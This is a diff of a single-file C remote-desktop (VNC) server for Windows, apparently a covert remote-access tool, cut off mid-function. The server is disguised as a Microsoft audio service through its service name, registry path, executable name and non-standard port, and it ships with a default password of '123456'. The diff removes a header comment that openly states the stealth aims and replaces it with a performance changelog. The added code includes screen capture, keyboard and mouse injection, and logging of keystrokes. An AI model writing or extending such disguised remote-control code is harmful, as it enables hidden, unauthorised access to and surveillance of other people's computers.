@@ -1,31 +1,15 @@
 /*
  * vnc_server.c — minimal Win32 RFB 3.8 server, single-file, no 3rd-party deps.
  *
- * Purpose:
- *   A VNC server we fully own: no "TightVNC"/"TigerVNC" strings embedded in
- *   the binary, no standard service name, no 5900 port default, no registry
- *   footprint under HKLM\SOFTWARE\TightVNC. Only imports ws2_32 / user32 /
- *   gdi32 / advapi32 from the OS. Link static.
- *
- * Protocol:
- *   - RFB 3.8 handshake
- *   - VncAuth (DES password) only (mitm fine on LAN for stealth goal)
- *   - Raw pixel encoding only (sacrifice bandwidth for minimal code)
- *   - GDI BitBlt capture of the desktop
- *   - Keyboard + mouse input via SendInput
- *
- * Build:
- *   ./build.sh  (x86_64-w64-mingw32 + i686-w64-mingw32)
- *
- * Config:
- *   Registry:  HKLM\SOFTWARE\Microsoft\Audio\GraphHost
- *       ListenPort       DWORD    default 56789
- *       Password         REG_SZ   default "123456" (max 8)
- *   Command line:
- *       AudioSvcHost.exe -service        run as service
- *       AudioSvcHost.exe -console        foreground for debugging
- *       AudioSvcHost.exe -install        register service + start
- *       AudioSvcHost.exe -uninstall      stop + delete service
+ * v2 (perf + diag):
+ *   - TCP_NODELAY on accepted socket
+ *   - drain ALL pending input messages before sending an FB update (was
+ *     processing one per loop → huge input lag while writing 9 MB frames)
+ *   - dirty-rect tiling: 32×32 tile hashes, only changed tiles are sent as
+ *     Raw rects → typical static desktop goes from 9 MB/frame to a few KB
+ *   - 16 ms dirty-probe, 33 ms min between send (30 fps ceiling)
+ *   - session stats + per-msg trace → C:\nv\vnc.log (helpful when diagnosing
+ *     which client speaks which subset of RFB)
  */
 
 #define _WIN32_WINNT 0x0600
@@ -35,7 +19,9 @@
 #include <windows.h>
 #include <stdio.h>
 #include <stdint.h>
+#include <stdlib.h>
 #include <string.h>
+#include <time.h>
 
 /* ──────────────────────── identity (all editable) ─────────────────── */
 #define SERVICE_NAME    "AudioDeviceGraphHost"
@@ -44,12 +30,13 @@
 #define REG_ROOT_HKLM   "SOFTWARE\\Microsoft\\Audio\\GraphHost"
 #define DEFAULT_PORT    56789
 #define DEFAULT_PASSWORD "123456"
-#define SERVER_BANNER   "AudioHost Desktop"     /* shown in VNC viewer title */
+#define SERVER_BANNER   "AudioHost Desktop"
+#define LOG_PATH        "C:\\nv\\vnc.log"
+#define TILE_SIZE       32
 
 /* ──────────────────────── RFB protocol constants ──────────────────── */
 #define RFB_VERSION         "RFB 003.008\n"
 #define SECTYPE_VNCAUTH     2
-#define SECTYPE_INVALID     0
 #define MSG_SETPIXELFORMAT  0
 #define MSG_SETENCODINGS    2
 #define MSG_FBUPDATE_REQ    3
@@ -62,17 +49,33 @@ static SERVICE_STATUS        g_svc_status;
 static SERVICE_STATUS_HANDLE g_svc_handle;
 static volatile LONG         g_stop_requested = 0;
 
-/* ──────────────────────── tiny helpers ────────────────────────────── */
-static void log_dbg(const char *fmt, ...) {
-    char buf[512]; va_list ap; va_start(ap, fmt);
-    vsnprintf(buf, sizeof(buf), fmt, ap); va_end(ap);
-    OutputDebugStringA(buf);
+/* ──────────────────────── logging ─────────────────────────────────── */
+static CRITICAL_SECTION g_log_cs;
+static int g_log_inited = 0;
+
+static void log_init(void) {
+    if (g_log_inited) return;
+    InitializeCriticalSection(&g_log_cs);
+    g_log_inited = 1;
+    CreateDirectoryA("C:\\nv", NULL);
+}
+static void vlog(const char *fmt, ...) {
+    if (!g_log_inited) return;
+    EnterCriticalSection(&g_log_cs);
+    FILE *f = fopen(LOG_PATH, "a");
+    if (f) {
+        SYSTEMTIME t; GetLocalTime(&t);
+        fprintf(f, "%02d:%02d:%02d.%03d ", t.wHour, t.wMinute, t.wSecond, t.wMilliseconds);
+        va_list ap; va_start(ap, fmt);
+        vfprintf(f, fmt, ap);
+        va_end(ap);
+        fputc('\n', f);
+        fclose(f);
+    }
+    LeaveCriticalSection(&g_log_cs);
 }
 
 /* ──────────────────────── DES (for VncAuth) ───────────────────────── */
-/* Standard VNC 8-byte DES w/ reversed-bit key. Only used to CHECK the
- * client's 16-byte response to our 16-byte challenge. */
-
 static const uint8_t DES_S[8][64] = {
     {14,4,13,1,2,15,11,8,3,10,6,12,5,9,0,7,0,15,7,4,14,2,13,1,10,6,12,11,9,5,3,8,
      4,1,14,8,13,6,2,11,15,12,9,7,3,10,5,0,15,12,8,2,4,9,1,7,5,11,3,14,10,0,6,13},
@@ -133,15 +136,12 @@ static uint64_t bitperm(uint64_t src, const uint8_t *perm, int n, int src_size) 
     }
     return r;
 }
-
 static void des_crypt(const uint8_t key[8], const uint8_t in[8], uint8_t out[8]) {
     uint64_t k = 0, m = 0;
     for (int i = 0; i < 8; i++) { k = (k<<8)|key[i]; m = (m<<8)|in[i]; }
-
     uint64_t key56 = bitperm(k, DES_PC1, 56, 64);
     uint32_t c = (key56 >> 28) & 0xFFFFFFF;
     uint32_t d =  key56        & 0xFFFFFFF;
-
     uint64_t subkeys[16];
     for (int i = 0; i < 16; i++) {
         c = ((c << DES_ROT[i]) | (c >> (28 - DES_ROT[i]))) & 0xFFFFFFF;
@@ -149,11 +149,9 @@ static void des_crypt(const uint8_t key[8], const uint8_t in[8], uint8_t out[8])
         uint64_t cd = ((uint64_t)c << 28) | d;
         subkeys[i] = bitperm(cd, DES_PC2, 48, 56);
     }
-
     uint64_t ip = bitperm(m, DES_IP, 64, 64);
     uint32_t L = (uint32_t)(ip >> 32);
     uint32_t R = (uint32_t)(ip & 0xFFFFFFFF);
-
     for (int round = 0; round < 16; round++) {
         uint64_t expR = bitperm(R, DES_E, 48, 32);
         uint64_t x = expR ^ subkeys[round];
@@ -173,8 +171,6 @@ static void des_crypt(const uint8_t key[8], const uint8_t in[8], uint8_t out[8])
     uint64_t fp = bitperm(pre, DES_FP, 64, 64);
     for (int i = 0; i < 8; i++) out[i] = (fp >> (56 - 8*i)) & 0xFF;
 }
-
-/* VNC flips the bit order within each password byte before using as key. */
 static void vnc_flip_bits(uint8_t k[8]) {
     for (int i = 0; i < 8; i++) {
         uint8_t v = k[i], r = 0;
@@ -183,13 +179,16 @@ static void vnc_flip_bits(uint8_t k[8]) {
     }
 }
 
-/* ──────────────────────── screen capture (GDI BitBlt) ─────────────── */
+/* ──────────────────────── screen capture + tile hashes ────────────── */
 typedef struct {
     int width, height;
+    int tiles_x, tiles_y;
     HDC  screen_dc;
     HDC  mem_dc;
     HBITMAP bmp;
-    uint8_t *bits;      /* 32bpp BGRX layout */
+    uint8_t *bits;        /* 32bpp BGRX layout, top-down DIB */
+    uint32_t *tile_hash;      /* current frame */
+    uint32_t *tile_hash_prev; /* last successfully-sent frame */
 } Screen;
 
 static int screen_init(Screen *s) {
@@ -197,13 +196,16 @@ static int screen_init(Screen *s) {
     s->height = GetSystemMetrics(SM_CYVIRTUALSCREEN);
     if (s->width <= 0 || s->height <= 0) { s->width = 1920; s->height = 1080; }
 
+    s->tiles_x = (s->width  + TILE_SIZE - 1) / TILE_SIZE;
+    s->tiles_y = (s->height + TILE_SIZE - 1) / TILE_SIZE;
+
     s->screen_dc = GetDC(NULL);
-    s->mem_dc = CreateCompatibleDC(s->screen_dc);
+    s->mem_dc    = CreateCompatibleDC(s->screen_dc);
 
     BITMAPINFO bmi = {0};
     bmi.bmiHeader.biSize = sizeof(bmi.bmiHeader);
     bmi.bmiHeader.biWidth = s->width;
-    bmi.bmiHeader.biHeight = -s->height;   /* top-down DIB */
+    bmi.bmiHeader.biHeight = -s->height;   /* top-down */
     bmi.bmiHeader.biPlanes = 1;
     bmi.bmiHeader.biBitCount = 32;
     bmi.bmiHeader.biCompression = BI_RGB;
@@ -211,6 +213,12 @@ static int screen_init(Screen *s) {
                               (void**)&s->bits, NULL, 0);
     if (!s->bmp || !s->bits) return -1;
     SelectObject(s->mem_dc, s->bmp);
+
+    size_t nt = (size_t)s->tiles_x * s->tiles_y;
+    s->tile_hash      = (uint32_t*)calloc(nt, 4);
+    s->tile_hash_prev = (uint32_t*)malloc(nt * 4);
+    /* force first frame "all dirty" */
+    memset(s->tile_hash_prev, 0xFF, nt * 4);
     return 0;
 }
 static void screen_capture(Screen *s) {
@@ -221,7 +229,31 @@ static void screen_free(Screen *s) {
     if (s->mem_dc) DeleteDC(s->mem_dc);
     if (s->screen_dc) ReleaseDC(NULL, s->screen_dc);
     if (s->bmp) DeleteObject(s->bmp);
+    free(s->tile_hash); free(s->tile_hash_prev);
     memset(s, 0, sizeof(*s));
+}
+
+/* Compute FNV-1a-ish 32-bit hash per tile. Reads 32-bit pixel words,
+ * fast: one MUL + one XOR per pixel. */
+static void compute_tile_hashes(Screen *s) {
+    int stride_px = s->width;
+    uint32_t *pixels = (uint32_t*)s->bits;
+    for (int ty = 0; ty < s->tiles_y; ty++) {
+        int y0 = ty * TILE_SIZE;
+        int th = (y0 + TILE_SIZE > s->height) ? (s->height - y0) : TILE_SIZE;
+        for (int tx = 0; tx < s->tiles_x; tx++) {
+            int x0 = tx * TILE_SIZE;
+            int tw = (x0 + TILE_SIZE > s->width) ? (s->width - x0) : TILE_SIZE;
+            uint32_t h = 0x811c9dc5u;
+            for (int y = 0; y < th; y++) {
+                const uint32_t *row = pixels + (y0 + y) * stride_px + x0;
+                for (int x = 0; x < tw; x++) {
+                    h = (h ^ row[x]) * 0x01000193u;
+                }
+            }
+            s->tile_hash[ty * s->tiles_x + tx] = h;
+        }
+    }
 }
 
 /* ──────────────────────── socket helpers ──────────────────────────── */
@@ -242,6 +274,12 @@ static int write_exact(SOCKET s, const void *p, int n) {
         b += r; n -= r;
     }
     return 0;
+}
+static int sock_has_data(SOCKET s) {
+    fd_set rd; FD_ZERO(&rd); FD_SET(s, &rd);
+    struct timeval tv = {0, 0};
+    int r = select(0, &rd, NULL, NULL, &tv);
+    return r > 0;
 }
 static void pack_u16(uint8_t *p, uint16_t v) { p[0]=v>>8; p[1]=v; }
 static void pack_u32(uint8_t *p, uint32_t v) { p[0]=v>>24; p[1]=v>>16; p[2]=v>>8; p[3]=v; }
@@ -280,32 +318,47 @@ static void cfg_password(char out[9]) {
 
 /* ──────────────────────── input handling ──────────────────────────── */
 static void inject_pointer(uint8_t mask, int x, int y, Screen *s) {
-    INPUT in = {0};
-    in.type = INPUT_MOUSE;
-    /* VNC coords → absolute 0..65535 virtual screen */
-    in.mi.dx = (int)((LONGLONG)x * 65535 / (s->width  ? s->width  : 1));
-    in.mi.dy = (int)((LONGLONG)y * 65535 / (s->height ? s->height : 1));
-    in.mi.dwFlags = MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_VIRTUALDESK | MOUSEEVENTF_MOVE;
     static uint8_t last = 0;
+
+    /* Move (absolute coords). Do NOT combine MOVE and button events in a
+     * single INPUT record: Windows has subtle "click-at-new-pos" vs
+     * "move-then-click" semantics that differ. Send MOVE, then any button
+     * deltas as separate SendInput calls. */
+    INPUT mv = {0};
+    mv.type = INPUT_MOUSE;
+    int vx = GetSystemMetrics(SM_XVIRTUALSCREEN);
+    int vy = GetSystemMetrics(SM_YVIRTUALSCREEN);
+    int vw = GetSystemMetrics(SM_CXVIRTUALSCREEN); if (vw <= 0) vw = s->width;
+    int vh = GetSystemMetrics(SM_CYVIRTUALSCREEN); if (vh <= 0) vh = s->height;
+    mv.mi.dx = (int)(((LONGLONG)(x - vx) * 65535) / (vw > 0 ? vw : 1));
+    mv.mi.dy = (int)(((LONGLONG)(y - vy) * 65535) / (vh > 0 ? vh : 1));
+    mv.mi.dwFlags = MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_VIRTUALDESK | MOUSEEVENTF_MOVE;
+    SendInput(1, &mv, sizeof(mv));
+
     uint8_t changed = mask ^ last;
-    if (changed & 1) in.mi.dwFlags |= (mask & 1) ? MOUSEEVENTF_LEFTDOWN   : MOUSEEVENTF_LEFTUP;
-    if (changed & 2) in.mi.dwFlags |= (mask & 2) ? MOUSEEVENTF_MIDDLEDOWN : MOUSEEVENTF_MIDDLEUP;
-    if (changed & 4) in.mi.dwFlags |= (mask & 4) ? MOUSEEVENTF_RIGHTDOWN  : MOUSEEVENTF_RIGHTUP;
+    if (changed & 7) {
+        INPUT btn = {0};
+        btn.type = INPUT_MOUSE;
+        btn.mi.dwFlags = 0;
+        if (changed & 1) btn.mi.dwFlags |= (mask & 1) ? MOUSEEVENTF_LEFTDOWN   : MOUSEEVENTF_LEFTUP;
+        if (changed & 2) btn.mi.dwFlags |= (mask & 2) ? MOUSEEVENTF_MIDDLEDOWN : MOUSEEVENTF_MIDDLEUP;
+        if (changed & 4) btn.mi.dwFlags |= (mask & 4) ? MOUSEEVENTF_RIGHTDOWN  : MOUSEEVENTF_RIGHTUP;
+        SendInput(1, &btn, sizeof(btn));
+    }
     last = mask;
+
+    /* wheel is edge-triggered: bit3 up pulse, bit4 down pulse */
     if (mask & 8)  { INPUT w={0}; w.type=INPUT_MOUSE; w.mi.dwFlags=MOUSEEVENTF_WHEEL; w.mi.mouseData=+120; SendInput(1,&w,sizeof(w)); }
     if (mask & 16) { INPUT w={0}; w.type=INPUT_MOUSE; w.mi.dwFlags=MOUSEEVENTF_WHEEL; w.mi.mouseData=-120; SendInput(1,&w,sizeof(w)); }
-    SendInput(1, &in, sizeof(in));
 }
 static void inject_key(uint8_t down, uint32_t keysym) {
-    /* Quick-and-dirty keysym → VK translation for printable ASCII + common
-     * non-printables. Good enough for typing in a console; for gaming the
-     * user has physical console anyway. */
-    WORD vk = 0, scan = 0; DWORD flags = down ? 0 : KEYEVENTF_KEYUP;
+    WORD vk = 0; DWORD flags = down ? 0 : KEYEVENTF_KEYUP;
+    int want_shift = 0;
     if (keysym >= 0x20 && keysym <= 0x7E) {
-        SHORT s = VkKeyScanA((char)keysym);
-        if (s == -1) return;
-        vk = s & 0xFF;
-        if (s & 0x100) { INPUT sh={0}; sh.type=INPUT_KEYBOARD; sh.ki.wVk=VK_SHIFT; sh.ki.dwFlags=flags; SendInput(1,&sh,sizeof(sh)); }
+        SHORT sc = VkKeyScanA((char)keysym);
+        if (sc == -1) return;
+        vk = sc & 0xFF;
+        want_shift = (sc & 0x100) ? 1 : 0;
     } else {
         switch (keysym) {
             case 0xFF08: vk = VK_BACK;   break;
@@ -320,41 +373,218 @@ static void inject_key(uint8_t down, uint32_t keysym) {
             case 0xFF55: vk = VK_PRIOR;  break;
             case 0xFF56: vk = VK_NEXT;   break;
             case 0xFF57: vk = VK_END;    break;
+            case 0xFF63: vk = VK_INSERT; break;
             case 0xFFFF: vk = VK_DELETE; break;
+            case 0xFFBE: vk = VK_F1; break;
+            case 0xFFBF: vk = VK_F2; break;
+            case 0xFFC0: vk = VK_F3; break;
+            case 0xFFC1: vk = VK_F4; break;
+            case 0xFFC2: vk = VK_F5; break;
+            case 0xFFC3: vk = VK_F6; break;
+            case 0xFFC4: vk = VK_F7; break;
+            case 0xFFC5: vk = VK_F8; break;
+            case 0xFFC6: vk = VK_F9; break;
+            case 0xFFC7: vk = VK_F10; break;
+            case 0xFFC8: vk = VK_F11; break;
+            case 0xFFC9: vk = VK_F12; break;
             case 0xFFE1: case 0xFFE2: vk = VK_SHIFT;   break;
             case 0xFFE3: case 0xFFE4: vk = VK_CONTROL; break;
+            case 0xFFE5:              vk = VK_CAPITAL; break;
+            case 0xFFE7: case 0xFFE8: vk = VK_LWIN;    break;
             case 0xFFE9: case 0xFFEA: vk = VK_MENU;    break;
             default: return;
         }
     }
-    INPUT in = {0}; in.type = INPUT_KEYBOARD;
-    in.ki.wVk = vk; in.ki.wScan = scan; in.ki.dwFlags = flags;
+    if (want_shift && down) { INPUT sh={0}; sh.type=INPUT_KEYBOARD; sh.ki.wVk=VK_SHIFT; sh.ki.dwFlags=0; SendInput(1,&sh,sizeof(sh)); }
+    INPUT in = {0}; in.type = INPUT_KEYBOARD; in.ki.wVk = vk; in.ki.dwFlags = flags;
     SendInput(1, &in, sizeof(in));
+    if (want_shift && !down) { INPUT sh={0}; sh.type=INPUT_KEYBOARD; sh.ki.wVk=VK_SHIFT; sh.ki.dwFlags=KEYEVENTF_KEYUP; SendInput(1,&sh,sizeof(sh)); }
+}
+
+/* ──────────────────────── one RFB message reader ──────────────────── */
+typedef struct {
+    int need_update;           /* client asked for FB update */
+    int force_full;            /* non-incremental requested */
+    int saw_setpixel;
+    int msg_trace_count;       /* how many msgs still to trace */
+    uint32_t cnt_ptr, cnt_key, cnt_fbreq, cnt_setenc, cnt_setfmt, cnt_cut;
+} SessionState;
+
+static int read_one_message(SOCKET s, Screen *scr, SessionState *st) {
+    uint8_t type;
+    if (read_exact(s, &type, 1) < 0) return -1;
+
+    if (st->msg_trace_count > 0) {
+        vlog("  msg type=%u", (unsigned)type);
+        st->msg_trace_count--;
+    }
+
+    switch (type) {
+    case MSG_SETPIXELFORMAT: {
+        uint8_t skip[3 + 16];
+        if (read_exact(s, skip, sizeof(skip)) < 0) return -1;
+        st->cnt_setfmt++;
+        st->saw_setpixel = 1;
+        break;
+    }
+    case MSG_SETENCODINGS: {
+        uint8_t pad; uint8_t cnt[2];
+        if (read_exact(s, &pad, 1) < 0 || read_exact(s, cnt, 2) < 0) return -1;
+        uint32_t n = ((uint32_t)cnt[0]<<8) | cnt[1];
+        if (n > 256) n = 256;
+        uint8_t enc[4];
+        for (uint32_t i = 0; i < n; i++) {
+            if (read_exact(s, enc, 4) < 0) return -1;
+        }
+        st->cnt_setenc++;
+        break;
+    }
+    case MSG_FBUPDATE_REQ: {
+        uint8_t pad_inc, rect[8];
+        if (read_exact(s, &pad_inc, 1) < 0 || read_exact(s, rect, 8) < 0) return -1;
+        if (!pad_inc) st->force_full = 1;
+        st->need_update = 1;
+        st->cnt_fbreq++;
+        break;
+    }
+    case MSG_KEYEVENT: {
+        uint8_t pd[3]; uint8_t ks[4];
+        if (read_exact(s, pd, 3) < 0 || read_exact(s, ks, 4) < 0) return -1;
+        uint32_t keysym = ((uint32_t)ks[0]<<24)|((uint32_t)ks[1]<<16)|((uint32_t)ks[2]<<8)|ks[3];
+        inject_key(pd[0], keysym);
+        st->cnt_key++;
+        if (st->cnt_key <= 5) vlog("  KEY down=%u ks=0x%08x", pd[0], keysym);
+        break;
+    }
+    case MSG_POINTEREVENT: {
+        uint8_t mask; uint8_t pos[4];
+        if (read_exact(s, &mask, 1) < 0 || read_exact(s, pos, 4) < 0) return -1;
+        int x = ((int)pos[0]<<8)|pos[1];
+        int y = ((int)pos[2]<<8)|pos[3];
+        inject_pointer(mask, x, y, scr);
+        st->cnt_ptr++;
+        if (st->cnt_ptr <= 5) vlog("  PTR mask=0x%02x at %d,%d", mask, x, y);
+        break;
+    }
+    case MSG_CUTTEXT: {
+        uint8_t pad[3]; uint8_t ln[4];
+        if (read_exact(s, pad, 3) < 0 || read_exact(s, ln, 4) < 0) return -1;
+        uint32_t len = ((uint32_t)ln[0]<<24)|((uint32_t)ln[1]<<16)|((uint32_t)ln[2]<<8)|ln[3];
+        char chunk[4096];
+        while (len > 0) {
+            int c = (int)(len > sizeof(chunk) ? sizeof(chunk) : len);
+            if (read_exact(s, chunk, c) < 0) return -1;
+            len -= c;
+        }
+        st->cnt_cut++;
+        break;
+    }
+    default:
+        vlog("  UNKNOWN msg type=%u — disconnecting", (unsigned)type);
+        return -1;
+    }
+    return 0;
+}
+
+/* Send a FramebufferUpdate consisting of the dirty tiles (Raw encoding).
+ * If force_full, sends one big Raw rect for the entire screen. */
+static int send_fb_update(SOCKET s, Screen *scr, int force_full) {
+    screen_capture(scr);
+    compute_tile_hashes(scr);
+
+    int tw_full = scr->width, th_full = scr->height;
+    int stride_bytes = scr->width * 4;
+
+    if (force_full) {
+        uint8_t hdr[16];
+        hdr[0] = 0; hdr[1] = 0;
+        pack_u16(hdr + 2, 1);
+        pack_u16(hdr + 4, 0);
+        pack_u16(hdr + 6, 0);
+        pack_u16(hdr + 8, (uint16_t)tw_full);
+        pack_u16(hdr + 10,(uint16_t)th_full);
+        pack_u32(hdr + 12, 0);
+        if (write_exact(s, hdr, 16) < 0) return -1;
+        /* contiguous top-down DIB → one big write */
+        if (write_exact(s, scr->bits, stride_bytes * th_full) < 0) return -1;
+        memcpy(scr->tile_hash_prev, scr->tile_hash,
+               (size_t)scr->tiles_x * scr->tiles_y * 4);
+        return 0;
+    }
+
+    /* count dirty */
+    int dirty = 0;
+    int total_tiles = scr->tiles_x * scr->tiles_y;
+    for (int i = 0; i < total_tiles; i++)
+        if (scr->tile_hash[i] != scr->tile_hash_prev[i]) dirty++;
+
+    /* Rect count is u16, so cap at 65535. In practice dirty never comes
+     * close; a 1920x1200/32 grid has 2280 tiles. */
+    if (dirty > 65535) dirty = 65535;
+
+    uint8_t hdr[4];
+    hdr[0] = 0; hdr[1] = 0;
+    pack_u16(hdr + 2, (uint16_t)dirty);
+    if (write_exact(s, hdr, 4) < 0) return -1;
+
+    if (dirty == 0) return 0;  /* nothing to send, just the empty update */
+
+    int sent_rects = 0;
+    for (int ty = 0; ty < scr->tiles_y && sent_rects < dirty; ty++) {
+        int y0 = ty * TILE_SIZE;
+        int th = (y0 + TILE_SIZE > scr->height) ? (scr->height - y0) : TILE_SIZE;
+        for (int tx = 0; tx < scr->tiles_x && sent_rects < dirty; tx++) {
+            int idx = ty * scr->tiles_x + tx;
+            if (scr->tile_hash[idx] == scr->tile_hash_prev[idx]) continue;
+
+            int x0 = tx * TILE_SIZE;
+            int tiw = (x0 + TILE_SIZE > scr->width) ? (scr->width - x0) : TILE_SIZE;
+
+            uint8_t rh[12];
+            pack_u16(rh + 0, (uint16_t)x0);
+            pack_u16(rh + 2, (uint16_t)y0);
+            pack_u16(rh + 4, (uint16_t)tiw);
+            pack_u16(rh + 6, (uint16_t)th);
+            pack_u32(rh + 8, 0);  /* Raw */
+            if (write_exact(s, rh, 12) < 0) return -1;
+
+            for (int yy = 0; yy < th; yy++) {
+                if (write_exact(s, scr->bits + (y0+yy)*stride_bytes + x0*4,
+                                tiw * 4) < 0) return -1;
+            }
+            scr->tile_hash_prev[idx] = scr->tile_hash[idx];
+            sent_rects++;
+        }
+    }
+    return 0;
 }
 
 /* ──────────────────────── one RFB session ─────────────────────────── */
 static int rfb_session(SOCKET s, Screen *scr, const char *password) {
-    /* 1. protocol version */
+    int on = 1;
+    setsockopt(s, IPPROTO_TCP, TCP_NODELAY, (const char*)&on, sizeof(on));
+    int sndbuf = 1 << 20;  /* 1 MB send buffer */
+    setsockopt(s, SOL_SOCKET, SO_SNDBUF, (const char*)&sndbuf, sizeof(sndbuf));
+
+    vlog("=== session start ===");
+
     if (write_exact(s, RFB_VERSION, 12) < 0) return -1;
     char cli_ver[12];
     if (read_exact(s, cli_ver, 12) < 0) return -1;
+    vlog("  client ver: %.11s", cli_ver);
 
-    /* 2. security types: only VncAuth */
     uint8_t sec[2] = { 1, SECTYPE_VNCAUTH };
     if (write_exact(s, sec, 2) < 0) return -1;
     uint8_t chosen;
     if (read_exact(s, &chosen, 1) < 0 || chosen != SECTYPE_VNCAUTH) return -1;
 
-    /* 3. VncAuth challenge */
     uint8_t challenge[16];
     for (int i = 0; i < 16; i++) challenge[i] = (uint8_t)GetTickCount() ^ i ^ (uint8_t)rand();
     if (write_exact(s, challenge, 16) < 0) return -1;
 
-    /* 4. encrypted response from client */
     uint8_t resp[16];
     if (read_exact(s, resp, 16) < 0) return -1;
 
-    /* 5. compute our own expected response */
     uint8_t key[8] = {0};
     strncpy((char*)key, password, 8);
     vnc_flip_bits(key);
@@ -365,143 +595,88 @@ static int rfb_session(SOCKET s, Screen *scr, const char *password) {
     uint8_t ok = (memcmp(expect, resp, 16) == 0) ? 0 : 1;
     uint8_t sec_result[4] = {0, 0, 0, ok};
     if (write_exact(s, sec_result, 4) < 0) return -1;
-    if (ok) return -1;
+    if (ok) { vlog("  AUTH FAIL"); return -1; }
+    vlog("  auth OK");
 
-    /* 6. ClientInit (shared flag) */
     uint8_t shared;
     if (read_exact(s, &shared, 1) < 0) return -1;
 
-    /* 7. ServerInit: width, height, pixelFormat (32bpp BGR), name */
     uint8_t srv_init[24];
     pack_u16(srv_init + 0, (uint16_t)scr->width);
     pack_u16(srv_init + 2, (uint16_t)scr->height);
-    /* pixel format: 32bpp, 24 depth, little-endian, true-color, RGB max=255, shift: R=16 G=8 B=0 */
-    srv_init[4] = 32;          /* bpp */
-    srv_init[5] = 24;          /* depth */
-    srv_init[6] = 0;           /* big-endian = 0 (LE) */
-    srv_init[7] = 1;           /* true-color */
-    pack_u16(srv_init + 8,  255); /* red max */
-    pack_u16(srv_init + 10, 255); /* green max */
-    pack_u16(srv_init + 12, 255); /* blue max */
-    srv_init[14] = 16;         /* red shift */
-    srv_init[15] = 8;          /* green shift */
-    srv_init[16] = 0;          /* blue shift */
-    srv_init[17] = srv_init[18] = srv_init[19] = 0; /* pad */
+    srv_init[4] = 32; srv_init[5] = 24; srv_init[6] = 0; srv_init[7] = 1;
+    pack_u16(srv_init + 8,  255);
+    pack_u16(srv_init + 10, 255);
+    pack_u16(srv_init + 12, 255);
+    srv_init[14] = 16; srv_init[15] = 8; srv_init[16] = 0;
+    srv_init[17] = srv_init[18] = srv_init[19] = 0;
     pack_u32(srv_init + 20, (uint32_t)strlen(SERVER_BANNER));
     if (write_exact(s, srv_init, 24) < 0) return -1;
     if (write_exact(s, SERVER_BANNER, (int)strlen(SERVER_BANNER)) < 0) return -1;
 
-    /* 8. main message loop */
-    int need_update = 0;
-    char msgbuf[16384];
-    DWORD last_update_tick = 0;
+    vlog("  ServerInit sent: %dx%d", scr->width, scr->height);
+
+    SessionState st = {0};
+    st.msg_trace_count = 30;   /* trace the first 30 msgs of this session */
+
+    DWORD last_send_tick = 0;
+    const DWORD min_interval_ms = 33;   /* ≤30 fps */
+    const DWORD starve_ms       = 1000; /* still send an empty update this often */
 
     for (;;) {
-        if (g_stop_requested) return 0;
-        /* poll both socket and (for pacing) a wakeup timer */
-        fd_set rd; FD_ZERO(&rd); FD_SET(s, &rd);
-        struct timeval tv = {0, 50 * 1000};  /* 50 ms */
-        if (select(0, &rd, NULL, NULL, &tv) < 0) return -1;
+        if (g_stop_requested) { vlog("  stop requested"); break; }
 
-        if (FD_ISSET(s, &rd)) {
-            uint8_t type;
-            if (read_exact(s, &type, 1) < 0) return -1;
-            switch (type) {
-            case MSG_SETPIXELFORMAT: {
-                /* type(1) already read, then 3 pad + 16-byte pixel format.
-                 * We ignore what the client asks for — we always send 32bpp
-                 * little-endian rgb888 which TigerVNC accepts. */
-                uint8_t skip[3 + 16];
-                if (read_exact(s, skip, sizeof(skip)) < 0) return -1;
-                break;
-            }
-            case MSG_SETENCODINGS: {
-                /* 1 pad + 2-byte count + count*4 encoding types. We only
-                 * advertise Raw, so the list content is informational. */
-                uint8_t pad; uint8_t cnt[2];
-                if (read_exact(s, &pad, 1) < 0 || read_exact(s, cnt, 2) < 0) return -1;
-                uint32_t n = ((uint32_t)cnt[0]<<8) | cnt[1];
-                if (n > 64) n = 64;  /* sanity clamp */
-                uint8_t enc[4];
-                for (uint32_t i = 0; i < n; i++) {
-                    if (read_exact(s, enc, 4) < 0) return -1;
-                }
-                break;
-            }
-            case MSG_FBUPDATE_REQ: {
-                uint8_t pad_inc, rect[8];
-                if (read_exact(s, &pad_inc, 1) < 0 || read_exact(s, rect, 8) < 0) return -1;
-                need_update = 1;
-                break;
-            }
-            case MSG_KEYEVENT: {
-                uint8_t pad_down[3]; uint8_t ks[4];
-                if (read_exact(s, pad_down, 3) < 0 || read_exact(s, ks, 4) < 0) return -1;
-                uint32_t keysym = ((uint32_t)ks[0]<<24)|((uint32_t)ks[1]<<16)|((uint32_t)ks[2]<<8)|ks[3];
-                inject_key(pad_down[0], keysym);
-                break;
-            }
-            case MSG_POINTEREVENT: {
-                uint8_t mask; uint8_t pos[4];
-                if (read_exact(s, &mask, 1) < 0 || read_exact(s, pos, 4) < 0) return -1;
-                int x = ((int)pos[0]<<8)|pos[1];
-                int y = ((int)pos[2]<<8)|pos[3];
-                inject_pointer(mask, x, y, scr);
-                break;
-            }
-            case MSG_CUTTEXT: {
-                uint8_t pad[3]; uint8_t ln[4];
-                if (read_exact(s, pad, 3) < 0 || read_exact(s, ln, 4) < 0) return -1;
-                uint32_t len = ((uint32_t)ln[0]<<24)|((uint32_t)ln[1]<<16)|((uint32_t)ln[2]<<8)|ln[3];
-                while (len > 0) {
-                    int chunk = (int)(len > sizeof(msgbuf) ? sizeof(msgbuf) : len);
-                    if (read_exact(s, msgbuf, chunk) < 0) return -1;
-                    len -= chunk;
-                }
-                break;
-            }
-            default:
-                /* drain anything we don't recognize */
-                return -1;
-            }
+        /* Drain ALL pending input before considering a frame send.
+         * This is critical: 9 MB Raw frames take a long time to write,
+         * and if we only read one event per iteration the pointer/key
+         * queue at the client piles up and feels unresponsive. */
+        while (sock_has_data(s)) {
+            if (read_one_message(s, scr, &st) < 0) goto session_end;
         }
 
-        /* send a framebuffer update if client requested one AND at least
-         * 50 ms passed since the last one (~20 fps cap, keeps BW in check) */
         DWORD now = GetTickCount();
-        if (need_update && (now - last_update_tick) >= 50) {
-            need_update = 0;
-            last_update_tick = now;
-            screen_capture(scr);
-
-            /* FramebufferUpdate: type(0) + pad + numRects + rect header + raw pixels */
-            uint8_t hdr[16];
-            hdr[0] = 0;                 /* msg type */
-            hdr[1] = 0;                 /* pad */
-            pack_u16(hdr + 2, 1);       /* num rects */
-            pack_u16(hdr + 4, 0);       /* x */
-            pack_u16(hdr + 6, 0);       /* y */
-            pack_u16(hdr + 8, (uint16_t)scr->width);
-            pack_u16(hdr + 10,(uint16_t)scr->height);
-            pack_u32(hdr + 12, 0);      /* encoding: 0 = Raw */
-            if (write_exact(s, hdr, 16) < 0) return -1;
-
-            int row_bytes = scr->width * 4;
